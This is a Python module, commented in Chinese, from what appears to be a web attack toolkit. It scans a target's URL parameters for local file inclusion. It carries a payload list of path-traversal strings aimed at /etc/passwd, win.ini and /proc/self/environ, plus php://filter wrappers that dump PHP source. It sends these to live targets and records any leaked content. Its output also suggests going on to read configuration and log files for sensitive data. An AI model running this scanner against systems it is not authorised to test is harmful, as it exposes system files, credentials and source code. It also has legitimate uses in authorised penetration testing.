#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
lfi.py — 本地文件包含漏洞检测
"""

import os, json, re, datetime, requests
from tools import RESULTS_BASE

TOOL_NAME = "本地文件包含检测"
TOOL_ID = "lfi"
TOOL_DESC = "检测文件包含类漏洞（路径穿越、远程文件包含等）"
TOOL_CATEGORY = "exploit"

class Colors:
    G = '\033[92m'; R = '\033[91m'; Y = '\033[93m'
    B = '\033[94m'; C = '\033[96m'; BD = '\033[1m'; RS = '\033[0m'

class Logger:
    def info(self, m): print(f"{Colors.B}[INFO] {m}{Colors.RS}")
    def success(self, m): print(f"{Colors.G}[+] {m}{Colors.RS}")
    def warning(self, m): print(f"{Colors.Y}[!] {m}{Colors.RS}")
    def error(self, m): print(f"{Colors.R}[-] {m}{Colors.RS}")
    def raw(self, m): print(m)

logger = Logger()

HEADERS = {
    "User-Agent": "Mozilla/5.0 Chrome/126.0.0.0 Safari/537.36",
}

# LFI 检测 payload
LFI_PAYLOADS = [
    # 基本路径穿越
    ("../../../etc/passwd", ["root:", "nobody:", "daemon:"]),
    ("../../../../etc/passwd", ["root:", "nobody:"]),
    ("....//....//....//etc/passwd", ["root:"]),
    ("..%2f..%2f..%2fetc%2fpasswd", ["root:"]),
    # Windows
    ("../../windows/win.ini", ["[fonts]", "[extensions]"]),
    ("..\\..\\..\\windows\\win.ini", ["[fonts]"]),
    # PHP wrapper
    ("php://filter/convert.base64-encode/resource=index.php", ["PD9waHA", "base64"]),
    ("php://filter/read=convert.base64-encode/resource=index", ["PD9waHA"]),
    # /proc (Linux)
    ("../../../proc/self/environ", ["PATH=", "HOME="]),
    ("../../../proc/version", ["Linux version"]),
]

# 匹配文件包含相关参数名
LFI_PARAMS = ["file", "page", "path", "include", "template", "load", "view",
              "dir", "folder", "document", "doc", "download", "read", "open",
              "src", "url", "lang", "locale", "language"]


def execute(scan_result, target_info):
    domain = target_info.get("domain", "unknown")
    base_url = target_info.get("base_url", "")
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    errors = []

    directories = scan_result.get("directories", [])
    api_endpoints = scan_result.get("api_endpoints", [])

    targets = []

    # 从目录中找含 LFI 参数名的 URL
    for d in directories:
        path = d.get("path", "")
        if d.get("status") != 200:
            continue
        for param in LFI_PARAMS:
            if f"{param}=" in path or path.endswith(f"/{param}"):
                targets.append(path)
                break

    # 补充 API 端点
    for ep in api_endpoints:
        ep_path = ep.get("path", "")
        for param in LFI_PARAMS:
            if f"{param}=" in ep_path or param in ep_path:
                full_url = base_url.rstrip("/") + "/" + ep_path.lstrip("/")
                if full_url not in targets:
                    targets.append(full_url)
                break

    if not targets:
        return {
            "tool": "lfi", "target": domain, "time": now,
            "status": "skipped",
            "summary": "未发现文件包含特征参数",
            "results": [], "errors": errors
        }

    logger.info(f"发现 {len(targets)} 个可能的 LFI 目标")
    findings = []

    for target_url in targets[:10]:
        logger.info(f"检测: {target_url}")
        target_found = False

        # 推断 URL 中的参数
        if "?" in target_url:
            base, qs = target_url.split("?", 1)
        else:
            base = target_url
            qs = ""

        for payload, signatures in LFI_PAYLOADS:
            if target_found:
                break
            try:
                # 构造请求 URL
                if qs:
                    # 已有参数 → 注入到第一个参数
                    params = qs.split("&")
                    for i, param in enumerate(params):
                        if "=" in param:
                            name = param.split("=")[0]
                            test_params = params.copy()
                            test_params[i] = f"{name}={payload}"
                            test_url = base + "?" + "&".join(test_params)
                            break
                    else:
                        # 所有参数都没 =，追加
                        test_url = target_url + payload
                else:
                    # 无参数 → 尝试加常见参数名
                    test_params_added = []
                    for pname in LFI_PARAMS:
                        if pname in target_url.lower():
                            test_params_added.append(f"{target_url}?{pname}={payload}")
                            break
                    test_urls = test_params_added if test_params_added else [f"{target_url}?file={payload}"]

                    for tu in test_urls[:3]:
                        if target_found:
                            break
                        try:
                            resp = requests.get(tu, headers=HEADERS, timeout=8, verify=False, allow_redirects=True)
                            for sig in signatures:
                                if sig in resp.text:
                                    findings.append({
                                        "url": tu,
                                        "payload": payload,
                                        "evidence": sig,
                                        "confidence": "high",
                                        "detail": f"响应中包含 {sig}"
                                    })
                                    logger.success(f"LFI确认: {tu} → {sig[:30]}")
                                    target_found = True
                                    break
                        except:
                            pass
                    continue

                # 发送请求
                resp = requests.get(test_url, headers=HEADERS, timeout=8, verify=False, allow_redirects=True)

                # 检查签名
                for sig in signatures:
                    if sig in resp.text:
                        findings.append({
                            "url": test_url,
                            "payload": payload,
                            "evidence": sig,
                            "confidence": "high",
                            "detail": f"响应中包含 {sig}"
                        })
                        logger.success(f"LFI确认: {test_url} → {sig[:30]}")
                        target_found = True
                        break

                # 检查 PHP wrapper base64
                if "base64" in payload and len(resp.text) > 10 and resp.text != "":
                    try:
                        import base64 as b64
                        decoded = b64.b64decode(resp.text).decode("utf-8", errors="ignore")
                        if "<?php" in decoded or "function" in decoded:
                            findings.append({
                                "url": test_url,
                                "payload": payload,
                                "confidence": "high",
                                "detail": "成功读取PHP源码",
                                "php_source_preview": decoded[:200]
                            })
                            target_found = True
                    except:
                        pass

            except requests.exceptions.ConnectionError:
                break
            except Exception as e:
                errors.append(str(e))

    status = "success" if findings else "skipped"
    summary = f"检测 {len(targets)} 个目标"
    if findings:
        summary += f"，确认 {len(findings)} 处 LFI 漏洞"

    result = {
        "tool": "lfi", "target": domain, "time": now,
        "status": status, "summary": summary,
        "targets_tested": targets,
        "findings": findings,
        "suggestion": "确认漏洞后尝试读取配置文件或日志文件获取敏感信息",
        "errors": errors
    }

    out_dir = os.path.join(RESULTS_BASE, "lfi")
    os.makedirs(out_dir, exist_ok=True)
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    out_file = os.path.join(out_dir, f"result_{domain}_{ts}.json")
    with open(out_file, 'w', encoding='utf-8') as f:
        json.dump(result, f, ensure_ascii=False, indent=2)

    return result
